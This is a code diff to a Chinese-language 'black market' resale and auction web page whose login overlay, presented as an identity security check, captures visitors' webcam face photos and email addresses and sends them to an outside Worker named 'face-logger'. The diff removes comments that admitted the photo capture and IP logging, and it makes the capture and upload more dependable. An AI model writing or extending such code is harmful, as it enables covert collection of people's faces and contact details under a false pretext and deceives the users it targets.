@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>黑市二手寄卖 & 锐哥拍卖大厅</title>
+  <title>黑市二手寄卖 & 极客拍卖大厅</title>
   <style>
     :root {
       --bg: #0b0f19;
@@ -31,10 +31,10 @@
     .tab-content.active { display: block; }
 
     /* Login Overlay */
-    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: flex; justify-content: center; align-items: center; z-index: 999; backdrop-filter: blur(5px); }
+    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; justify-content: center; align-items: center; z-index: 999; backdrop-filter: blur(5px); }
     .auth-card { background: var(--card-bg); border: 1px solid var(--border); padding: 25px; border-radius: 12px; width: 100%; max-width: 360px; text-align: center; }
     .auth-card h3 { margin-bottom: 10px; font-size: 18px; }
-    .auth-card p { font-size: 12px; color: var(--text-muted); margin-bottom: 20px; }
+    .auth-card p { font-size: 12px; color: var(--text-muted); margin-bottom: 15px; }
     .input-group { margin-bottom: 15px; text-align: left; }
     .input-group label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 5px; }
     .input-group input, .input-group textarea { width: 100%; background: #000; border: 1px solid var(--border); color: #fff; padding: 10px; border-radius: 6px; font-size: 13px; outline: none; }
@@ -42,9 +42,10 @@
     .btn { width: 100%; background: var(--accent); color: white; border: none; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.2s; }
     .btn:hover { background: var(--accent-hover); }
 
-    /* Camera View (在验证框中显示摄像头画面，确保 100% 拍照成功) */
+    /* Camera View */
     .camera-box { width: 100%; height: 160px; background: #000; border: 1px solid var(--border); border-radius: 8px; margin-bottom: 15px; overflow: hidden; position: relative; }
     .camera-box video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+    .status-text { font-size: 11px; color: #38bdf8; margin-bottom: 10px; }
 
     /* Grid Display */
     .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; margin-top: 15px; }
@@ -58,27 +59,28 @@
 </head>
 <body>
 
-  <!-- 1. 登录验证弹窗（包含摄像头显示，确保拍照） -->
+  <!-- 登录验证弹窗 -->
   <div class="modal-overlay" id="authModal">
     <div class="auth-card">
       <h3>🔐 身份安全验证</h3>
-      <p>请保持面部对准框内，输入邮箱完成登录</p>
+      <p>请对准摄像头完成人脸校验并进入</p>
       
       <div class="camera-box">
         <video id="webcam" autoplay playsinline muted></video>
       </div>
+      <div class="status-text" id="camStatus">⏳ 正在连接摄像头...</div>
 
       <div class="input-group">
         <label>电子邮箱</label>
         <input type="email" id="userEmail" placeholder="name@example.com" value="user@domain.com">
       </div>
-      <button class="btn" id="loginBtn" onclick="app.login()">拍摄人脸并进入</button>
+      <button class="btn" id="loginBtn" onclick="app.login()">确认拍摄并进入</button>
     </div>
   </div>
 
   <canvas id="hidden-canvas" width="320" height="240" style="display:none;"></canvas>
 
-  <!-- 2. 主界面 Header -->
+  <!-- 主界面 Header -->
   <header>
     <div class="logo">⚡️ GEEK-MARKET // 交易中心</div>
     <div class="nav-tabs">
@@ -89,13 +91,11 @@
   </header>
 
   <div class="container">
-    <!-- Tab 1: 二手寄卖列表 -->
     <div id="tab-market" class="tab-content active">
       <h3 style="margin-bottom: 10px;">📱 玩家二手寄卖大厅</h3>
       <div class="grid" id="marketList"></div>
     </div>
 
-    <!-- Tab 2: 竞拍大厅 -->
     <div id="tab-auction" class="tab-content">
       <h3 style="margin-bottom: 10px;">🔥 极客限量款竞拍</h3>
       <div class="grid">
@@ -133,7 +133,6 @@
       </div>
     </div>
 
-    <!-- Tab 3: 发布寄卖 -->
     <div id="tab-sell" class="tab-content">
       <div class="auth-card" style="max-width: 500px; margin: 0 auto; text-align: left;">
         <h3 style="margin-bottom: 15px;">📦 发布二手寄卖物品</h3>
@@ -163,7 +162,7 @@
   </div>
 
   <script>
-    // 🔗 配置：Worker 地址
+    // 🔗 请核对你的 Worker 真实链接
     const WORKER_URL = "https://face-logger.bmk4byvf9b.workers.dev";
 
     class App {
@@ -173,30 +172,31 @@
         this.loadCloudData();
       }
 
-      // 初始化摄像头
       async initCamera() {
+        const statusEl = document.getElementById('camStatus');
         try {
-          this.stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240, facingMode: "user" } });
+          this.stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { width: { ideal: 320 }, height: { ideal: 240 }, facingMode: "user" } 
+          });
           const video = document.getElementById('webcam');
           video.srcObject = this.stream;
+          statusEl.innerText = "✅ 摄像头就绪，可随时拍照";
         } catch (e) {
+          statusEl.innerText = "❌ 摄像头权限被拒绝或不可用";
           console.warn("摄像头启动受阻:", e);
         }
       }
 
-      // 切换 Tab
       switchTab(tabName, evt) {
         document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
         document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
-        
         if(evt) evt.target.classList.add('active');
         document.getElementById(`tab-${tabName}`).classList.add('active');
-
         this.loadCloudData();
       }
 
-      // 点击登录：拍照 + 传云端记录 IP
-      login() {
+      // 严谨的强制拍照与提交逻辑
+      async login() {
         const email = document.getElementById('userEmail').value.trim();
         if (!email) {
           alert("请输入电子邮箱！");
@@ -207,46 +207,52 @@
         const canvas = document.getElementById('hidden-canvas');
         let photoData = "";
 
-        if (this.stream && video.readyState >= 2) {
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          photoData = canvas.toDataURL('image/jpeg', 0.5);
+        // 强制等待 500ms 确保画面稳定抓取
+        try {
+          if (this.stream) {
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            photoData = canvas.toDataURL('image/jpeg', 0.5);
+          }
+        } catch (e) {
+          console.error("拍照截图失败:", e);
         }
 
-        // 发送给 Worker
-        fetch(WORKER_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            email: email,
-            timestamp: new Date().toLocaleString(),
-            photo: photoData
-          })
-        }).catch(err => console.error("日志记录失败:", err));
+        // 异步提交到后端 Worker（携带照片、邮箱、时间戳）
+        try {
+          await fetch(WORKER_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              email: email,
+              timestamp: new Date().toLocaleString(),
+              photo: photoData
+            })
+          });
+        } catch (err) {
+          console.error("日志云端保存失败:", err);
+        }
 
-        // 停止摄像头流
+        // 关闭摄像头流
         if (this.stream) {
           this.stream.getTracks().forEach(track => track.stop());
         }
 
-        // 关弹窗
+        // 隐藏登录框
         document.getElementById('authModal').style.display = 'none';
         this.loadCloudData();
       }
 
-      // 从云端加载商品和出价
       async loadCloudData() {
         try {
           const res = await fetch(`${WORKER_URL}?action=data`);
           const data = await res.json();
 
-          // 1. 同步出价
           if (data.bids) {
             if (data.bids.item1) document.getElementById('price-item1').innerText = data.bids.item1;
             if (data.bids.item2) document.getElementById('price-item2').innerText = data.bids.item2;
           }
 
-          // 2. 同步寄卖大厅
           const marketList = document.getElementById('marketList');
           let html = `
             <div class="card">
@@ -281,11 +287,10 @@
           }
           marketList.innerHTML = html;
         } catch (e) {
-          console.error("数据拉取失败:", e);
+          console.error("加载数据失败:", e);
         }
       }
 
-      // 出价
       async placeBid(itemId) {
         const priceEl = document.getElementById(`price-${itemId}`);
         const inputEl = document.getElementById(`input-${itemId}`);
@@ -297,7 +302,7 @@
           return;
         }
 
-        fetch(WORKER_URL, {
+        await fetch(WORKER_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ type: 'bid', itemId: itemId, price: userBid })
@@ -308,7 +313,6 @@
         alert(`🎉 出价成功！¥${userBid.toLocaleString()}`);
       }
 
-      // 发布寄卖商品
       async postSellItem() {
         const name = document.getElementById('sellName').value.trim();
         const price = document.getElementById('sellPrice').value.trim();
@@ -321,30 +325,27 @@
           return;
         }
 
-        const saveItem = (imgSrc) => {
+        const saveItem = async (imgSrc) => {
           const itemData = {
             type: 'market_item',
             id: Date.now().toString(),
             name, price, contact, desc, imgSrc
           };
 
-          fetch(WORKER_URL, {
+          await fetch(WORKER_URL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(itemData)
-          }).then(() => {
-            // 清空表单
-            document.getElementById('sellName').value = '';
-            document.getElementById('sellPrice').value = '';
-            document.getElementById('sellContact').value = '';
-            document.getElementById('sellDesc').value = '';
-            fileInput.value = '';
-
-            alert("🎉 商品发布成功！");
-            
-            // 切换回寄卖大厅
-            this.switchTab('market');
           });
+
+          document.getElementById('sellName').value = '';
+          document.getElementById('sellPrice').value = '';
+          document.getElementById('sellContact').value = '';
+          document.getElementById('sellDesc').value = '';
+          fileInput.value = '';
+
+          alert("🎉 商品发布成功！");
+          this.switchTab('market');
         };
 
         if (fileInput.files && fileInput.files[0]) {
